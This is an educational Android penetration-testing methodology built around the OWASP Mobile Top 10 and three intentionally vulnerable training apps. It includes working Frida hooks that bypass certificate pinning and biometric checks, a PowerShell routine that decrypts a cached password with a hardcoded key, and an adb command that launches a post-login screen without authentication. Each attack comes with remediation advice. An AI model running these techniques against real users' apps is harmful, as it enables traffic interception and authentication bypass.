OWASP Mobile Top 10: Android Methodology

A hands-on mobile penetration testing walkthrough, mapped to the OWASP Mobile Top 10 (2024) and MASVS/MASTG, demonstrated through the intentionally vulnerable apps AllSafe and InsecureBankv2.

Mobile Practice red team | Android · AllSafe + InsecureBankv2 + AndroGoat · Windows

What is AllSafe, InsecureBankv2, and AndroGoat?

AllSafe is an open-source, intentionally vulnerable Android application by Info Sec Adventures. Each screen is a self-contained challenge covering a common mobile bug class, which makes it a safe and legal target for practicing static and dynamic analysis without touching anyone else's app.

AllSafe is the primary target of this guide, but documenting a clean example of every OWASP Mobile Top 10 (2024) risk takes more than one app, so two others help out. InsecureBankv2 ships a real backend, which lets us show what AllSafe can't: cleartext credentials on the wire and a server that trusts client-supplied data (M5, M4). AndroGoat ships a correctly implemented certificate-pinning screen, so we can practice the real pinning bypasses (objection, Frida) against a pin that actually fights back. AllSafe is the spine; the other two fill the gaps where an example needs a live backend or a working control.

Objective

This write-up is a methodology guide: a repeatable process for testing an Android app, walked through the OWASP Mobile Top 10 (2024) and mapped to the MASVS control groups. AllSafe, InsecureBankv2, and AndroGoat are the live examples, but the aim is the method, something I (and anyone starting mobile pentesting) can reuse on the next app.

The standard is divided into various groups of controls, labeled MASVS-XXXXX, that represent the most critical areas of the mobile attack surface:

  • MASVS-STORAGE: Secure storage of sensitive data on a device (data-at-rest).
  • MASVS-CRYPTO: Cryptographic functionality used to protect sensitive data.
  • MASVS-AUTH: Authentication and authorization mechanisms used by the mobile app.
  • MASVS-NETWORK: Secure network communication between the mobile app and remote endpoints (data-in-transit).
  • MASVS-PLATFORM: Secure interaction with the underlying mobile platform and other installed apps.
  • MASVS-CODE: Security best practices for data processing and keeping the app up-to-date.
  • MASVS-RESILIENCE: Resilience to reverse engineering and tampering attempts.
  • MASVS-PRIVACY: Privacy controls to protect user privacy.

In this write-up, we will identify vulnerabilities that map to each of these and write a report as if this were a professional job we were carrying out for a client. I will note the steps I took and the things I found. I am using Windows for my write-up, but you can use anything that feels comfortable for you. Just keep in mind, the commands are written for Windows PowerShell so you will need to use their equivalents in their respective OS environments.

Methodology

Each chapter becomes a theme, mapped to its MASVS group and the OWASP Mobile Top 10 (2024):

  • Recon & Static Analysis will cover hardcoded secrets, insecure logging, exported components, and risky manifest flags (MASVS-CODE, MASVS-PRIVACY; M2, M6, M8).
  • Traffic & Cert Pinning will cover cleartext traffic, TLS interception, and certificate-pinning bypass (MASVS-NETWORK; M5).
  • Insecure Data Storage will cover SharedPreferences, SQLite, and files left in the clear (MASVS-STORAGE; M9).
  • Broken Cryptography will cover weak algorithms, hardcoded keys and IVs, ECB, and custom crypto (MASVS-CRYPTO; M10).
  • Authentication & Session will cover local auth bypass, biometric handling, and session/token storage and reuse (MASVS-AUTH; M1, M3).
  • Platform Interaction will cover exported components, deep links, intents, WebView settings, and JS bridges (MASVS-PLATFORM; M4, M8).
  • Code-Level Bugs & Injection will cover input validation, SQL/command/path injection, and unsafe deserialization (MASVS-CODE; M4).
  • Reverse Engineering & Anti-Tamper will cover Frida instrumentation, root/tamper detection and bypass, and obfuscation (MASVS-RESILIENCE; M7).

01Recon & Static Analysis

MASVS: CODE, PRIVACY  ·  Mobile Top 10: M2, M6, M8

Concept

Recon and static analysis is the first pass over an app, before any dynamic testing. We read the package itself - the manifest, the resources, and the decompiled code - to map the attack surface and catch the flaws that are visible without running anything. It is less a single vulnerability and more the phase that surfaces several: secrets and keys baked into the binary, sensitive data leaked to the logs, and components or flags left misconfigured. In OWASP terms that spans M2 (Inadequate Supply Chain Security), M6 (Inadequate Privacy Controls), and M8 (Security Misconfiguration). Our tools are jadx (decompile to readable Java/Kotlin) and apktool (decode the manifest and resources).

AllSafe is a stand-in for real apps we would check in the real world. In a real engagement, usually we will get:

  • The Binary - client will email us the APK/IPA or gives us a TestFlight/Firebase build. Binary just means the compiled app file: the .apk on Android or the .ipa (containing a Mach-O) on iOS. Not the phone.
  • Test accounts - credentials for staging environments.
  • Scope and rules of engagement - what backends we can touch or not touch.
  • An authorization letter - lets us do our hacking.

We setup our Pixel 5, we got our Burp Proxy setup and also on the phone. We exported our CA and pushed it to the Pixel 5. We can see decrypted HTTPS traffic. We downloaded AllSafe and pushed it to the phone. We also got jadx and apktool. jadx is the single most important Android static tool.

Four passes with an automated fifth.

1. Peek at the structure

We could just decompile it, but it's useful to know what exactly we're holding first.

  • How big/complex is it? Is it one classes.dex or six?
  • Are there native libraries? If yes, that's where Reverse Engineering comes into play.
  • Are there assets or raw resources? (Which our peeking immediately finds.)
  • Is it packed/obfuscated? If we already expect weird filenames, encrypted dex, or a loader stub, we won't have to waste a lot of time.
Note A loader stub is what is found instead of real code when an app is packed (protected/obfuscated by a commercial packer). It encrypts the real code into an assets/ blob or a .so instead of a classes.dex, with a tiny loader whose main job is to decrypt the real dex and load it into memory at runtime. Static analysis can only go so far when visible dexes are empty, there's an encrypted blob in assets, or a suspicious native lib. We will go over dynamic analysis later, but that will let us dump the real dex from memory!

3. Review the manifest

Let's navigate to Resources. AndroidManifest.xml is the app's blueprint. It has all declared components, permissions, and exported entry points. We should always check this first on every test.

We are looking for specific flags that can lead us to interesting finds.

Risky manifest flags

This shows android:debuggable="true" is on, which means the debug build shipped to production. Anyone can use a debugger, run code as the app, read the memory... Should never be set in a release.

  • android:allowBackup="true" - App data can be extracted over ADB with adb backup. No Root needed! This leaks whatever the app stores locally.
  • android:networkSecurityConfig - Points to an XML file. Defines trusted CAs, cleartext exceptions, and pinning. Its absence (plus cleartext on) is itself a weak posture.
  • android:requestLegacyExternalStorage="true" - Opts the app out of Scoped Storage and back into the old, permissive external-storage model. Combined with the storage permissions, the app can read and write broadly across shared storage, which widens what a backup, another app, or a compromised component can reach. It is a privacy and data-exposure concern.

android:exported="true" on activities / services / receivers / providers. Keep in mind, some of these are exported by design and benign, such as the ProfileInstallReceiver in the image. We should focus on the app's own component.

The real lead is an exported <activity> whose intent-filter contains VIEW + BROWSABLE + a custom <data android:scheme="allsafe">. That combination = reachable from any web page! <activity android:name="...challenges.DeepLinkTask"> - this names the class. This tells us where to read.

Now you jump to infosecadventures.allsafe.challenges.DeepLinkTask in jadx!

We see onCreate() which is where we should start. This is the method Android calls the moment the activity is launched. So this is where the incoming intent and its URI get received and read:

  • getIntent()
  • intent.getData()
  • data.getQueryParameter("key")

We can get a sense of the data flow. The BROWSABLE filter that we saw earlier means an attacker controls the URI that starts the activity! When it starts, onCreate is called by the system. This is the first spot where attacker-controlled input is consumed.

From here we can see a getString(R.string.key). To explain this: R.string.key isn't the secret, but it's a label that says "go look up the string named key." Which means the actual value lives in a separate resource file. This is called strings.xml. So it's saying compare the user's input to whatever's stored under key and Android fetches the real value at runtime.

Analogy Think of R.string.key as a locker number, and strings.xml as the locker. The code only shows you the number, but you have to open the locker to see what's inside. The secret was in the locker the whole time. The developer didn't write it directly on the door.

And guess what? strings.xml ships within the APK exactly like the code does. So anyone with the app can read it! The developer just added one hop of indirection.

This is also why when we do a keyword grep and our automation in step 5 it dodges detection. These both scan the code, and the value is a random UUID with no telltale word like "password", so the only way to catch it is to notice the R.string.key reference and follow this clue into strings.xml.

MobSF is a first pass, not the test! Automated tools find the obvious, but can miss the interesting that our human intuition can find. MobSF will catch debuggable and a literal password = "...", but it will not understand that an exported activity bypasses your login, or that a "random" token is derived from the device ID. Remediation

The fixes for what recon turned up, then the general controls for the categories it touches.

For the flaws in this section:

  • Hardcoded secret in resources (M8/M2): don't ship secrets in strings.xml or other resources - anyone who unzips the APK reads them. Keep secrets on the server and fetch them at runtime; if a value gates something, enforce that gate server-side, not with a shipped constant.
  • Insecure logging (M6): strip sensitive data (URIs with query strings, tokens, PII) from log calls, and remove or disable debug logging in release builds. Never Log.d a full deep-link Uri.
  • Exported component / BROWSABLE deep link (M8): set android:exported="false" unless the component genuinely must be reachable from outside, and treat everything a deep link carries as untrusted - validate and authorize it before acting.

General controls, most important first:

  • Most applicable here: ship safe defaults (M8) - android:exported="false", debuggable="false", allowBackup="false", and least-privilege permissions.
  • Keep PII out of the logs and out of other apps' reach (M6); scrub debug logging from release builds.
  • Vet third-party SDKs and pin your dependencies (M2); secrets belong on the server, never compiled into the shipped package.

02Traffic Interception & Cert Pinning

MASVS: NETWORK  ·  Mobile Top 10: M5

For this section we focus on traffic interception and certificate pinning. While this guide is mainly built around AllSafe, we also bring in AndroGoat and InsecureBankv2 for their use cases in this scenario. Plus, it doesn't hurt to have more examples of vulnerabilities, no?

Android focus This guide focuses on Android. An iOS write-up (the IPA/Mach-O, ATS, Keychain, and the iOS equivalents of these techniques) may follow in the future.

Almost every mobile app is a thin client wrapped around HTTP(S) APIs. The login screen, the account list, the "transfer money" button - they all become requests to a backend. If we can read and rewrite those requests, the mobile pentest essentially becomes a web pentest with a different toolset.

For this section we grab that view: first by sitting in the middle of plain TLS, then by beating certificate pinning, the wall that makes traffic vanish the moment we point a proxy at it. Since these are safe apps we control, we aren't performing an active attack, but keep that in mind when testing real apps of your own.

Concept - the MITM proxy

When the app makes an HTTPS call, two things happen: a TLS handshake, then encrypted bytes start flowing. Our Burp man-in-the-middle (MITM) proxy breaks that single call into two separate TLS sessions - Device ↔ Proxy and Proxy ↔ Server. The proxy presents a certificate signed by its own CA, so to the app the connection looks legit and it accepts it. That makes the whole game two moves:

  1. Make the device trust the proxy CA. Install Burp's CA certificate and generic HTTPS decrypts.
  2. Make the app accept that trust. Certificate pinning fights us here. A pinned app ignores the device trust store entirely and checks the server certificate against a copy it ships inside the binary. Our proxy CA isn't that copy, so the handshake fails and we see nothing.

Once traffic is decrypted we can read credentials and session tokens off the wire, spot data sent over cleartext http://, change an account number and replay, or fuzz parameters. Every web/API technique applies from that point on; the mobile-specific skill is used only for that initial decryption step.

Pinning is a feature, not a bug in your setup The most common beginner mistake is to see "app shows a network error / no requests in Burp" and assume the proxy is misconfigured. Confirm the proxy first: open the device browser and load a site. If that decrypts but the app doesn't, the proxy is fine and you've hit pinning. That distinction is what this whole section is about.

The Burp Suite workflow

  • HTTP history - the passive record of every request. Where we read creds, tokens, and cleartext.
  • Intercept - pause a request in flight and edit it before it forwards. Live tampering.
  • Repeater - replay and hand-edit a single request over and over. The core of API testing.
  • Intruder - automate fuzzing a parameter across a wordlist.
  • Match and replace - auto-rewrite a header or body on every request (force an Authorization header, strip a client-side flag).
  • Target scope - add only our app's hosts so we aren't buried in OS noise, then filter history to in-scope only.

Case 2 - When the user CA isn't trusted (NSC)

API 23 and below (Android 6 and older). These apps trust user certs by default, so we just install our CA and we're set.

The picture above shows the certificate hash we placed in /system/etc/security/cacerts/. On the right, the Android device shows that same PortSwigger certificate we exported from Burp Suite, which makes us trusted to the app.

API 24 and above (Android 7+). These apps only trust the system CA store by default. They ignore user-installed certs unless the app ships an NSC (Network Security Config) that explicitly opts in with <certificates src="user"/>. Most apps do not opt in, because trusting user certs is the insecure choice, so our exported Burp certificate is invisible to the app. In that case we promote the CA into the system store (which needs root), and then app HTTPS decrypts.

Important nuance - it's the app's targetSdk, not the device This user-CA behavior keys off the app's targetSdkVersion, not the device's Android version. An app targeting API 23 still trusts user certs even on an Android 14 phone. So when deciding "do I need Case 2," check the app's targetSdk, not just the OS.

Diagnosis flowchart:

  1. Browser decrypts too? No → the proxy is broken (a setup problem).
  2. Browser decrypts but the app doesn't, and pushing your CA to the system store fixes it → that was Case 2.
  3. App still blocks even with the CA in the system store → that is Case 3, pinning (a stronger check that ignores the trust store entirely).

Case 3 - Certificate pinning

A pinned app loads fine in the device browser, but in the app every HTTPS call fails with a generic "network error" / "can't connect," and Burp logs a TLS alert (handshake failure / unknown CA) instead of a decrypted flow. That asymmetry is the signature of pinning. (See the certificate pinning concept.) In Case 3, we have several methods for bypassing certificate pinning, listed below in order from easiest to most difficult:

Bypass Option 1 - objection

Bypass Option 3 - hook the specific class

The generic scripts cover OkHttp, the default TrustManager, and friends, but a custom or obfuscated implementation can slip past. For this method we stop the Frida command from Option 2 and target the class directly. Back in jadx, we look inside the code, identify the exact framework giving us trouble, and hook it precisely. In any decompiled app, you hunt for the method that validates the server certificate and throws on a mismatch.

  • Known class names: CertificatePinner (OkHttp), X509TrustManager / TrustManager, HostnameVerifier, TrustKit, or the literal word pinning.
  • Telltale method names: check, checkServerTrusted, verify, checkTrusted.
  • The exception it throws: SSLPeerUnverifiedException or CertificateException. Find the method that throws one of those on a cert mismatch and we've found the pin.

For an OkHttp app like AndroGoat that method is okhttp3.CertificatePinner.check(); for a custom implementation it's whatever class jadx reveals doing the same job. The method that throws is the constant you search for, not the class name. We then neutralize it with a small Frida script that replaces every overload of check() with a no-op:

Java.perform(function () {
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overloads.forEach(function (overload) {
        overload.implementation = function () {
            console.log('[+] okhttp3.CertificatePinner.check() bypassed');
            return;   // return without throwing = the pin passes
        };
    });
});

Bypass Option 4 - Flutter (proxy fails even with no pinning)

Flutter apps bundle their own TLS stack (BoringSSL inside libflutter.so) and ignore the system trust store, so traffic won't proxy at all and route-via-proxy alone shows nothing. This looks like pinning, but it's the runtime never consulting our CA. The bypass is to patch the native verify function: reFlutter repackages the APK to route through our proxy and disable verification, or a Frida script patches ssl_verify_cert_chain / ssl_crypto_x509_session_verify_cert_chain in libflutter.so (by scanning for the function's byte pattern) to force it to return success. This is an advanced technique we reach for only once we confirm a Flutter target, so we'll cover it in depth later.

Finding an M5 flaw in an unexpected way in AllSafe

One AllSafe result deserves its own walk-through, because it looks like a setup fluke but is actually a vulnerability. AllSafe includes a Certificate Pinning challenge, so we point Burp at it.

But something interesting happens the moment we tap "Send Request":

The HTTPS traffic is already decrypted and we can read it, which means no certificate pinning is effectively taking place. Have we somehow already bypassed it? Normally you would reach for a tool like Frida or objection to defeat pinning, but our set-up has already neutralized it. That is not luck - we may have found an even more severe M5 vulnerability.

So what happened? Let's read the challenge code at infosecadventures.allsafe.challenges.CertificatePinning.

a) A pin that can never match. The class defines a deliberately invalid fingerprint:

private static final String INVALID_HASH = "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

b) It fails a request on purpose to see the real cert. On screen load, extractPeerCertificateChain() builds a client pinned to that invalid hash and fires a request that is guaranteed to fail:

private void extractPeerCertificateChain() {
    OkHttpClient okHttpClient = new OkHttpClient.Builder()
        .certificatePinner(new CertificatePinner.Builder()
            .add("httpbin.io", INVALID_HASH).build())   // a pin that can never match
        .build();
    Request request = new Request.Builder().url("https://httpbin.io/json").build();
    okHttpClient.newCall(request).enqueue(new AnonymousClass2());   // fails on purpose
}

c) It scrapes the real cert hashes out of the failure (AnonymousClass2.onFailure). When a pin does not match, OkHttp throws an error whose message lists the real peer-certificate fingerprints it just saw. The code reads them out of that text:

String[] lines = message.split(System.getProperty("line.separator"));
for (String line : lines) {
    if (!line.trim().equals(INVALID_HASH) && line.trim().startsWith("sha256")) {
        String pin = line.trim().split(":")[0].trim();
        this.hashes.add(pin);          // stores whatever cert was actually on the wire
    }
}

d) It pins to those harvested hashes (button handler, lambda$onCreateView$0). When we tap the button, the "real" check is built from the fingerprints it just collected:

CertificatePinner.Builder certificatePinner = new CertificatePinner.Builder();
for (String hash : this.hashes) {
    certificatePinner.add("httpbin.io", hash);   // pins to the cert it just observed
}
OkHttpClient okHttpClient = new OkHttpClient.Builder()
    .certificatePinner(certificatePinner.build()).build();

Why it auto-bypassed. A correct pin is a fixed fingerprint of the genuine server, compiled into the app, so any certificate that isn't the real server's fails. AllSafe never hardcodes one. Instead it snaps a fingerprint of whatever certificate is on the wire at connect time, then pins to that. With Burp trusted and in the middle, the certificate it observes is Burp's, so it harvests Burp's fingerprint and pins to Burp. When the real request runs, Burp's cert matches the Burp-derived pin, the check passes, and the traffic decrypts. Nothing to bypass - the control validates the man-in-the-middle against itself.

Is this Case 2, or something else? A fair question: did our own trusted CA fix this, the way it does in Case 2 above? No. Case 2 is a trust problem - the app refuses a user cert, and promoting it to the system store fixes it. Here our CA was already trusted, and a correctly pinned app would still have blocked us, because pinning ignores the trust store entirely. So this belongs to Case 3 (certificate pinning), but as the anomaly: the pin is derived from the live connection, so it accepts Burp automatically. It doesn't fall under any of the four bypass options either, because no bypass was needed. That is what makes it worse than ordinary missing pinning - the control is present but inert by design.

Concept

04Broken Cryptography

MASVS: CRYPTO  ·  Mobile Top 10: M10

Concept

In the previous section, we covered how we found some files in plaintext off disk. Now we are going to focus on files that are encrypted. Developers reach for a crypto API, accidentally configure it incorrectly or miss a vulnerability, and ship something that looks encrypted, but when we look closely we realize it isn't. We will essentially just read the code, find the key, and decrypt the "encrypted" blob offline. Let's use AndroGoat for this section, which focuses on MASVS-CRYPTO, OWASP Mobile Top 10 M10 - Insufficient Cryptography. Along with AndroGoat we will open up jadx and have objection ready.

We have to keep in mind: if the key sits next to the ciphertext, then it isn't encryption. It's just obfuscation with some ribbons. Let's find the key from the decompiled code, the same way we did in the Recon & Static Analysis section.

Below are the things we usually look for in regards to Broken Cryptography:

MistakeWhy it's broken
Hardcoded keyThe key is baked into the binary as a string or byte array. Anyone who decompiles the app gets it. The "secret" is shipped to every attacker.
ECB modeEach block is encrypted independently, so identical plaintext blocks produce identical ciphertext blocks. Structure leaks straight through - patterns survive encryption.
Static / null IVA fixed initialization vector (often all-zero bytes) reused for every encryption. Removes the randomness CBC/CTR rely on; identical plaintexts encrypt identically and the scheme becomes deterministic.
Weak algorithmsDES / 3DES (56-bit), RC4, MD5, SHA-1. Broken or far too small. MD5/SHA-1 for password hashing or "integrity" is a finding on its own.
Home-rolled cryptoXOR with a repeating key, custom byte-shuffles, "encryption" someone invented. Always breakable; never trust a scheme that isn't a vetted standard.
Base64 ≠ encryptionBase64 is encoding, not encryption. dGVzdA== is reversible by anyone. Surprisingly common as a fake "encrypt this token" step.
Predictable salt / no saltA constant salt (or none) lets attackers precompute and reuse rainbow tables across all users.
Bad randomnessjava.util.Random is not cryptographically secure - its output is predictable from a few samples. Keys, IVs, salts, and tokens must come from SecureRandom (Android) or SecRandomCopyBytes (iOS).

05Authentication & Session

MASVS: AUTH  ·  Mobile Top 10: M1, M3

Concept

An app asks itself, "is this user allowed?". It then has a PIN screen, a fingerprint gate, an isLoggedIn boolean, and using those things it trusts its own answer. But on a device WE control, every one of those checks is just code we can rewrite at runtime. In this section we will force those checks to lie, then look at the other half of the problem: the tokens that do reach the server, and whether they're minted, stored, rotated, and expired correctly.

This section focuses on MASVS-AUTH (Authentication and Session Management) and the OWASP Mobile Top 10 categories M1 - Improper Credential Usage and M3 - Insecure Authentication/Authorization. Our targets:

  • AndroGoat - for the biometric authentication challenge (M3).
  • InsecureBankv2 - for insecurely stored and hardcoded credentials (M1).

We will also use Frida and objection.

two families of auth finding Authentication findings split into two families with very different severities, and it helps to know which you're writing: the difference is "the attacker needs a rooted device in their hand" versus "the attacker needs only your token." Family A - Client-Side Authentication Bypass: a check (PIN, biometric, logged-in flag) enforced on the device, defeated by rewriting it at runtime. Device-bound, so usually Medium. Family B - Weak Session Management / JWT: token-level flaws (alg:none, a weak signing secret, no expiry, no server-side revocation on logout). Remotely exploitable, so usually higher. This section demonstrates Family A (the biometric bypass) alongside the M1 credential-handling failures.

Exploiting the vulnerability.

Step 1 - identify the exact targets we'll hook, from jadx:

Step 2 - decide the reroute. We make onAuthenticationFailed and onAuthenticationError call onAuthenticationSucceeded. We hijack the two paths we control and point them at the success code.

Step 3 - write the hook:

Java.perform(function () {

    // (A) neutralize Kotlin's null-check so we can pass null
    Java.use('kotlin.jvm.internal.Intrinsics')
        .checkNotNullParameter.overload('java.lang.Object', 'java.lang.String')
        .implementation = function (obj, name) {};

    // (B) handle to the callback class
    var Callback = Java.use('owasp.sat.agoat.BioMetricAuthActivity$onCreate$1');

    // (C) reroute the paths WE can trigger into the success path
    Callback.onAuthenticationFailed.implementation = function () {
        console.log('[+] failed -> forcing success');
        this.onAuthenticationSucceeded(null);
    };
    Callback.onAuthenticationError.implementation = function (code, msg) {
        console.log('[+] error/cancel -> forcing success');
        this.onAuthenticationSucceeded(null);
    };
});

What and why for each piece:

  • Java.perform(function(){ ... }) - run our code once the Android Java runtime is up. The app is Java/Kotlin on a VM, so Frida has to wait for that VM before it can touch classes.
  • Java.use('...class...') - get a handle to a class. We need a reference before we can rewrite its methods.
  • Method.implementation = function(){ ... } - replace what the method does. This is the actual override; our code runs instead of the app's.
  • this.onAuthenticationSucceeded(null) inside the failed/error hooks - run the success path. That's the reroute; null because we have no real result and the method never uses it anyway.
  • The Intrinsics.checkNotNullParameter no-op - Kotlin auto-inserts a runtime null-check on result; passing null would throw, so we blank that one check out. A pure Kotlin gotcha, not the concept.

Step 4 - save the script to a file, because frida -l loads a script from a path on disk.

M1 - Improper Credential Usage (InsecureBankv2)

This is about credentials specifically - the things that prove our identity: passwords, API keys, session tokens, and secrets. A credential can be mishandled anywhere it lives:

  • Stored insecurely on the device (InsecureBankv2's cached login, which we cover first).
  • Hardcoded into the binary (like the AWS key we found earlier, which we cover shortly).
  • Transmitted insecurely (cleartext over the wire, such as what we saw in Chapter 3 / M5).
  • Validated weakly, or reused and never rotated.

A lot of the time, the thing that authenticates is handled carelessly wherever it lives.

how is this different from M9 - Insecure Data Storage? A password in shared_prefs is genuinely both. Through the M9 lens it's sensitive data stored in the clear; through the M1 lens it's a credential mishandled. We decide how to file it based on root cause and impact: if it's a credential (a thing used to authenticate access), we file it under M1; if it's medical records, transaction lists, and so on, we file it under M9. It wouldn't be wrong to label a credential-in-storage as both.

Identifying the vulnerability. InsecureBankv2 is purposefully vulnerable for learning. It has a login and a "remember me" style credential cache. We first check shared_prefs, because that's the number-one place credentials go when they're cached for future logins. Since we logged in previously with dinesh / Dinesh@123$ back in Chapter 3, if cached, they should still be there.

We see two strings, superSecurePassword and EncryptedUsername. We'll be the judge of how "encrypted" and "super secure" these are. Let's decode them both from Base64.

The username decoded to a readable word - dinesh. So it was only Base64; no key was needed. The password decoded into 16 random bytes, so it IS actually encrypted (AES ciphertext). The decode alone failed, which means we need to find a key, similar to what we did in the Broken Cryptography section. It's always good to try the cheapest attack first before chasing rabbits:

Check storage → Decode → Escalate to key recovery.

So let's pull the APK, open jadx, search for Crypto / Cipher.getInstance, and use our skills to find the key.

Looks like we found something. Let's take a closer peek.

A "super secret key" for a "super secure password," eh? Everything needed to reverse it is right there:

  • Algorithm: Cipher.getInstance("AES/CBC/PKCS5Padding") - AES-256, CBC mode.
  • Key: "This is the super secret key 123" - 32 characters, which is 256 bits, confirming AES-256.
  • IV: ivBytes = {0,0,0,...} - 16 zero bytes, a static all-zero IV.

This reveals a lot of important information:

  • There is a hardcoded key baked into the APK (M10 hardcoded key). It ships to every attacker.
  • A static / all-zero IV (M10 static IV) - the exact "Static / null IV" scenario we noted in the Chapter 5 table.
  • So the "superSecurePassword" AES layer provides no real protection - the key that "protects" it is inside the very app we pulled.

Exploiting it. We have our Base64 string (DTrW2VXjSoFdg0e61fHxJg==) pulled from shared_prefs, and we want the plaintext password. We look at the methods in the code and find which one is most applicable given our input (the string) and desired output (the plaintext password).

MethodTakesReturnsFits our problem?

aes256decrypt(...)raw bytesplaintext bytesPartly - decrypts, but wants raw bytes, not a Base64 string.

So we take the recipe from aesDeccryptedString and rewrite it in PowerShell (locally, so no sensitive data leaves our machine):

$key = [System.Text.Encoding]::UTF8.GetBytes("This is the super secret key 123")
$iv  = New-Object byte[] 16
$ct  = [System.Convert]::FromBase64String("DTrW2VXjSoFdg0e61fHxJg==")

$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key     = $key
$aes.IV      = $iv
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

$pt = $aes.CreateDecryptor().TransformFinalBlock($ct, 0, $ct.Length)
[System.Text.Encoding]::UTF8.GetString($pt)

And we got it! Using the recipe found in the code, we rewrote the AES decryption in PowerShell, ran it, and got the password of Dinesh@123$.

The AWS key we found in Chapter 5. I've mentioned a few times that we'd address the little key we found by accident in the Broken Cryptography chapter. Here we are - it's a similar example to the one we just did. In AndroGoat's HardCodeActivity we saw:

A cloud credential hardcoded into the app's source.

So how does this differ from InsecureBankv2? Both are M1 (Improper Credential Usage), but they fail at different points in the credential's lifecycle:

  • InsecureBankv2 = a credential stored insecurely at runtime (cached to shared_prefs, "protected" by Base64 and a hardcoded-key AES). A storage failure.
  • AWS key = a credential embedded into the binary at build time. A hardcoding failure - the secret ships inside the APK to every single user and attacker.

A hardcoded secret is exposed the instant we decompile. We just had to search SecretKeySpec (or something similar) in jadx to find it.

Remediation

The specific fixes for what we found, then the general controls every app should apply for M1 and M3.

For the flaws in this section:

  • Biometric bypass (M3): bind the gate to the hardware. Use BiometricPrompt with a CryptoObject wrapping an Android Keystore key created with setUserAuthenticationRequired(true), so a successful prompt releases a key an attacker can't fabricate and a faked callback yields nothing. Never gate on a bare boolean or a UI callback, and enforce the real authorization on the server.
  • Stored credentials (M1): don't cache the password at all if you can avoid it. If you must, use EncryptedSharedPreferences backed by a Keystore master key - never a hardcoded AES key, never an all-zero IV, and never Base64 dressed up as "encryption." Prefer a short-lived, server-issued token over the raw password.
  • Hardcoded AWS key (M1): never embed a credential in the binary. Fetch short-lived, least-privilege credentials at runtime from your backend, and rotate any secret that has ever shipped in an APK.

General M1 (Improper Credential Usage) controls, most important first:

  • Most applicable here: store secrets only in the OS-backed vault (Android Keystore / iOS Keychain), never in plain shared_prefs, and never hardcode keys or credentials in the app.
  • Encoding is not encryption - never treat Base64 (or a hardcoded-key cipher) as protection.
  • Transmit credentials only over TLS, never in cleartext (ties back to M5).
  • Prefer short-lived, scoped, rotatable tokens over long-lived passwords held on the device.

General M3 (Insecure Authentication/Authorization) controls, most important first:

  • Most applicable here: treat every client-side check as UI convenience, not a security boundary - enforce authorization server-side, and bind biometric/PIN gates to a Keystore/Keychain key requiring user presence so "success" releases a secret rather than a boolean.
  • Rotate session tokens at every privilege transition (login, password change) to prevent fixation.
  • Set short token expiry and enforce server-side revocation, so logout actually invalidates the session.
  • Reject alg:none and pin the expected JWT algorithm; sign with a long random secret or asymmetric keys.

06Platform Interaction (IPC, Deep Links, WebViews)

MASVS: PLATFORM  ·  Mobile Top 10: M4, M8

Concept

As we know, apps live in their own sandbox and can't directly touch another app's files. So how do they cooperate? Through IPC (Inter-Process Communication). The OS provides controlled channels, and the app's manifest declares which of its components can be reached through them.

Chapter 6 was about crypto, data at rest, and who is allowed in. M4 is about the app trusting input it shouldn't, or emitting output unsafely. On the web, input usually means form fields, headers, and cookies. On mobile, the most interesting input arrives through Intents, deep links, exported components, content-provider queries, and content loaded into a WebView. An exported component is basically a public function that any other app (or a web page, if it's BROWSABLE) can call. If that entry point lets in attacker-controlled input without validation, we get injection. That is essentially what M4 is about.

Android - four component types and the export flag. An Android app is built from four kinds of components, all declared in AndroidManifest.xml (we read this back in Chapter 2):

  • Activities - screens.
  • Services - background work.
  • Broadcast Receivers - listeners for system or app events.
  • Content Providers - structured data exposed over a content:// URI, usually backed by a database.

Each component is either exported or not. The flag is set two ways:

  • Explicitly: android:exported="true" or "false".
  • Implicitly: a component with an <intent-filter> defaults to exported on older targets. (Since API 31 / Android 12, android:exported is mandatory when a filter is present, but plenty of apps still target older SDKs or set it incorrectly.)

An exported component with no permission guard is an open entry point. If an Activity that shows your account details is exported, a malicious app can launch it. If a Content Provider backing the notes database is exported, any app can read (and sometimes write) that database.

iOS - URL schemes and the absence of "components". While this writeup is Android focused, iOS is worth a mention. iOS has no exported-Activity equivalent; there is no general way for one app to launch the screen of another. The classic IPC surface is the custom URL scheme. An app registers a scheme like ovaa:// in its Info.plist under CFBundleURLTypes → CFBundleURLSchemes. Any app, or web page, can then open ovaa://do/something?param=value, and the target app's URL handler is invoked with that input, which it frequently trusts. The modern, safer version is the Universal Link (Android's equivalent is the App Link): an https:// URL that the OS routes into the app only after verifying a signed association file hosted on the domain. Custom schemes have no ownership check, which is why any app can register fb:// and hijack it.

Deep links and WebViews. Two surfaces span both platforms and carry attacker-controlled data straight into the app:

  • Deep links (custom scheme or App/Universal Link) - the path and query parameters are attacker-controlled. If the app uses them to pick an action, navigate, or build a request without validation, we get unintended-action triggering, parameter injection, or an open redirect.
  • WebViews - an embedded browser (WebView on Android, WKWebView / legacy UIWebView on iOS). If it loads attacker-influenced URLs, or bridges page JavaScript to native code, the page becomes a foothold inside the app's sandbox.

This section focuses on MASVS-PLATFORM and the OWASP Mobile Top 10 categories M4 - Insufficient Input/Output Validation and M8 - Security Misconfiguration. Our targets:

  • InsecureBankv2 - exported Activities, an exported Content Provider, and an exported Broadcast Receiver.
  • AllSafe - an externally reachable deep link and an unsafe WebView.

1. Exported Activity (InsecureBankv2)

We read the decoded manifest for android:exported="true" activities, then jump straight to a post-login screen without logging in.

Let's break down the contents of AndroidManifest.xml quickly. Green is the activities we will exploit, yellow is the name of each activity, and blue is android:exported="true". (Note: there are two other M8-interesting findings in this screenshot we address in the report: android:debuggable="true" and android:allowBackup="true".) For example, we see com.android.insecurebankv2/.PostLogin as one of the activities marked android:exported="true".

adb shell am start -n com.android.insecurebankv2/.PostLogin

Nice. After running the command we land on the PostLogin screen with no authentication.

How did that work? The key idea is that an app is not one big locked building, it is a row of separate rooms. Each screen in an Android app is an Activity, an independent thing the system can start on its own. Normally we walk in the front door, LoginActivity, which we can see is the MAIN / LAUNCHER in its intent-filter. Once login works, the app sends us to PostLogin. As a reminder, android:exported="true" means any app (or adb) can start that Activity directly; exported="false" (or absent with no intent-filter) means only the app's own code can open it. A sensitive screen trusts that it's only reachable after auth, but if it's left exported, it isn't. Breaking the command down:

  • adb shell = run a command on the phone.
